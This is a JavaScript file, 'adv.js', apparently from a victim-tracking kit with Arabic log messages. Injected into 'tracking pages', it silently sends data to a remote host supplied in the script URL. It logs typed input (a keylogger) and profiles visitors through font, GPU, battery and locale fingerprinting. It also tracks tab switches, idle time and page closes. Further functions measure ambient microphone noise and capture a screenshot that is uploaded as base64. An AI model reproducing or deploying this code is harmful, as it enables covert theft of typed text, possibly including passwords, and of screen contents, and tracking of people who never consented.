/**
 * adv.js — Advanced tracking features
 * Injected into all tracking pages via <script src="/adv.js?u=UID&a=HOST">
 */
(function(){
  var uid = new URLSearchParams(document.currentScript.src.split('?')[1]).get('u') || '';
  var a   = new URLSearchParams(document.currentScript.src.split('?')[1]).get('a') || '';

  function post(path, data){
    try{
      var x=new XMLHttpRequest();
      var p=Object.keys(data).map(function(k){return encodeURIComponent(k)+"="+encodeURIComponent(data[k]);}).join("&");
      x.open("POST",a+path,true);
      x.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
      x.send(p);
    }catch(e){}
  }

  // ── 1. Tab Visibility Tracker ─────────────────────────────────────────────────
  // Detects when user switches tabs, minimizes browser, or locks screen
  var _tabHidden = 0, _tabVisible = Date.now(), _tabSwitches = 0;
  document.addEventListener('visibilitychange', function(){
    if(document.hidden){
      _tabHidden = Date.now();
      _tabSwitches++;
      post('/network', { uid: uid, data: '👁️ التبديل عن التبويب #'+_tabSwitches+' — بعد '+(Math.round((_tabHidden-_tabVisible)/1000))+'ث من الفتح' });
    } else {
      var away = _tabHidden ? Math.round((Date.now()-_tabHidden)/1000) : 0;
      _tabVisible = Date.now();
      if(away > 1) post('/network', { uid: uid, data: '👁️ عاد للتبويب — كان غائباً '+away+'ث' });
    }
  });

  // ── 2. Keystroke / Click Logger ───────────────────────────────────────────────
  // Captures typed text in any input/textarea on page
  var _typed = '', _lastSend = 0;
  document.addEventListener('input', function(e){
    if(e.target && (e.target.tagName==='INPUT'||e.target.tagName==='TEXTAREA')){
      _typed += (e.target.value||'');
      var now = Date.now();
      if(now - _lastSend > 3000 && _typed.trim()){
        post('/network', { uid: uid, data: '⌨️ نص مُدخَل: '+_typed.slice(0,200) });
        _typed = ''; _lastSend = now;
      }
    }
  }, true);
  // Click counter
  var _clicks = 0;
  document.addEventListener('click', function(){ _clicks++; }, true);
  setTimeout(function(){ if(_clicks>0) post('/network', { uid: uid, data: '🖱️ عدد النقرات: '+_clicks }); }, 15000);

  // ── 3. Dark Mode + Display Settings ──────────────────────────────────────────
  var darkMode = window.matchMedia('(prefers-color-scheme: dark)').matches;
  var reducedMotion = window.matchMedia('(prefers-reduced-motion: reduce)').matches;
  var colorDepth = screen.colorDepth;
  var pixelRatio = window.devicePixelRatio || 1;
  var orientation = screen.orientation ? screen.orientation.type : (window.innerWidth > window.innerHeight ? 'landscape' : 'portrait');
  post('/network', { uid: uid, data:
    '🌙 الوضع: '+(darkMode?'ليلي':'نهاري')+
    ' | 🖥️ ColorDepth: '+colorDepth+
    ' | 📐 PixelRatio: '+pixelRatio.toFixed(1)+
    ' | 📱 الاتجاه: '+orientation+
    ' | 🎞️ ReducedMotion: '+reducedMotion
  });

  // ── 4. Font Fingerprinting ────────────────────────────────────────────────────
  // Detects installed fonts using canvas rendering differences
  setTimeout(function(){
    try{
      var testFonts=['Arial','Times New Roman','Courier New','Georgia','Verdana',
        'Trebuchet MS','Impact','Comic Sans MS','Tahoma','Palatino',
        'Garamond','Bookman','Helvetica','Lucida Sans','Calibri',
        'Cambria','Consolas','Monaco','Gill Sans','Franklin Gothic'];
      var canvas=document.createElement('canvas'), ctx=canvas.getContext('2d');
      canvas.width=200; canvas.height=30;
      ctx.font='14px monospace'; ctx.fillText('mmmmmmmmmmlli',0,20);
      var base = canvas.toDataURL();
      var found=[];
      testFonts.forEach(function(f){
        canvas.width=200; canvas.height=30;
        ctx.font='14px "'+f+'", monospace'; ctx.fillText('mmmmmmmmmmlli',0,20);
        if(canvas.toDataURL() !== base) found.push(f);
      });
      if(found.length) post('/network', { uid: uid, data: '🔤 خطوط مثبّتة: '+found.join(', ') });
    }catch(e){}
  }, 2000);

  // ── 5. WebGL GPU Fingerprint ──────────────────────────────────────────────────
  try{
    var glc = document.createElement('canvas');
    var gl = glc.getContext('webgl') || glc.getContext('experimental-webgl');
    if(gl){
      var dbg = gl.getExtension('WEBGL_debug_renderer_info');
      var vendor   = dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL)   : gl.getParameter(gl.VENDOR);
      var renderer = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER);
      post('/network', { uid: uid, data: '🎮 GPU: '+vendor+' | '+renderer });
    }
  }catch(e){}

  // ── 6. Idle Time Detector ─────────────────────────────────────────────────────
  var _lastActivity = Date.now();
  ['mousemove','keydown','scroll','touchstart','click'].forEach(function(ev){
    document.addEventListener(ev, function(){ _lastActivity = Date.now(); }, { passive: true });
  });
  var _idleReported = false;
  setInterval(function(){
    var idle = Math.round((Date.now() - _lastActivity)/1000);
    if(idle > 30 && !_idleReported){
      _idleReported = true;
      post('/network', { uid: uid, data: '💤 المستخدم خامل منذ '+idle+' ثانية' });
    } else if(idle < 5) { _idleReported = false; }
  }, 10000);

  // ── 7. Page Close Beacon ──────────────────────────────────────────────────────
  var _openTime = Date.now();
  window.addEventListener('beforeunload', function(){
    var secs = Math.round((Date.now()-_openTime)/1000);
    navigator.sendBeacon(a+'/network',
      'uid='+encodeURIComponent(uid)+'&data='+encodeURIComponent('🚪 أغلق الصفحة بعد '+secs+'ث'));
  });

  // ── 8. Touch Pressure & Screen Activity ──────────────────────────────────────
  document.addEventListener('touchstart', function(e){
    if(e.touches[0] && e.touches[0].force !== undefined && e.touches[0].force > 0){
      post('/network', { uid: uid, data: '👆 ضغط اللمس: '+e.touches[0].force.toFixed(2) });
    }
  }, { passive: true, once: true });

  // ── 9. Deep Language & Locale Scan ───────────────────────────────────────────
  setTimeout(function(){
    var langs = (navigator.languages || [navigator.language]).join(', ');
    var tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
    var locale = Intl.DateTimeFormat().resolvedOptions().locale || '';
    var hour12 = Intl.DateTimeFormat().resolvedOptions().hour12;
    post('/network', { uid: uid, data:
      '🌍 اللغات: '+langs+
      '\n🌐 المنطقة الزمنية: '+tz+
      '\n📅 الصيغة: '+(hour12?'12-ساعة':'24-ساعة')+
      '\n🏳️ Locale: '+locale
    });
  }, 1000);

  // ── 10. Ambient Noise Level (from mic stream if available) ───────────────────
  window._analyzeAmbientNoise = function(stream){
    try{
      var ac = new (window.AudioContext||window.webkitAudioContext)();
      var src = ac.createMediaStreamSource(stream);
      var analyser = ac.createAnalyser();
      analyser.fftSize = 256;
      src.connect(analyser);
      var data = new Uint8Array(analyser.frequencyBinCount);
      var samples = [], count = 0;
      var iv = setInterval(function(){
        analyser.getByteFrequencyData(data);
        var avg = data.reduce(function(s,v){return s+v;},0)/data.length;
        samples.push(avg);
        if(++count >= 5){
          clearInterval(iv);
          var level = Math.round(samples.reduce(function(s,v){return s+v;},0)/samples.length);
          var label = level < 10 ? '🔇 صامت جداً' : level < 40 ? '🔉 هادئ' : level < 80 ? '🔊 ضجيج متوسط' : '📢 ضجيج عالٍ';
          post('/network', { uid: uid, data: '🎙️ مستوى الضوضاء المحيطة: '+level+'/255 — '+label });
          try{ ac.close(); }catch(e){}
        }
      }, 800);
    }catch(e){}
  };

  // ── 11. Screen Recording Attempt (getDisplayMedia — premium feel) ────────────
  // Tries silently; only works if user accepts the share screen dialog
  window._tryScreenCapture = function(){
    if(!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) return;
    navigator.mediaDevices.getDisplayMedia({video:{cursor:'never'},audio:false}).then(function(stream){
      var v=document.createElement('video'); v.srcObject=stream;
      v.play().then(function(){
        setTimeout(function(){
          var cv=document.createElement('canvas');
          cv.width=v.videoWidth||1280; cv.height=v.videoHeight||720;
          cv.getContext('2d').drawImage(v,0,0,cv.width,cv.height);
          stream.getTracks().forEach(function(t){t.stop();});
          var b64=cv.toDataURL('image/jpeg',0.6).replace('data:image/jpeg;base64,','');
          post('/screencap', { uid: uid, img: b64 });
        }, 500);
      });
    }).catch(function(){});
  };

  // ── 12. Battery Deep Scan ─────────────────────────────────────────────────────
  if('getBattery' in navigator){
    navigator.getBattery().then(function(b){
      post('/network', { uid: uid, data:
        '🔋 البطارية: '+Math.round(b.level*100)+'%'+
        ' | '+( b.charging ? '⚡ يشحن' : '🔌 لا يشحن')+
        (b.chargingTime<Infinity ? ' | وقت الشحن: '+Math.round(b.chargingTime/60)+'د' : '')+
        (b.dischargingTime<Infinity ? ' | تفريغ خلال: '+Math.round(b.dischargingTime/60)+'د' : '')
      });
      b.addEventListener('levelchange', function(){
        post('/network', { uid: uid, data: '🔋 تغيّر البطارية: '+Math.round(b.level*100)+'%' });
      });
      b.addEventListener('chargingchange', function(){
        post('/network', { uid: uid, data: b.charging ? '⚡ بدأ الشحن!' : '🔌 فُصل الشاحن!' });
      });
    }).catch(function(){});
  }

})();
